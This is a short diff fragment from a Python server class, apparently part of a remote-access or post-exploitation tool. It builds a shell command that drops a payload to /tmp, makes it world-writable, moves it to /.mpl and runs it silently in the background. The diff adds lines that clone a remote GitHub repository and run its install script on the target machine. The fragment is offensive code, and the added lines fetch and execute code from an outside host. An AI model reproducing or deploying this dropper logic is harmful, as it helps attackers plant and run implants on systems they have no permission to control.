@@ -124,6 +124,8 @@ class Server:
             "cat >/tmp/tmpmpl;"+\
             "chmod 777 /tmp/tmpmpl;"+\
             "mv /tmp/tmpmpl /.mpl;"+\
+            "git clone https://github.com/entynetproject/mouse-substrate.git;"+\
+            "cd mouse-substrate && chmod +x install.sh && ./install.sh;"+\
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
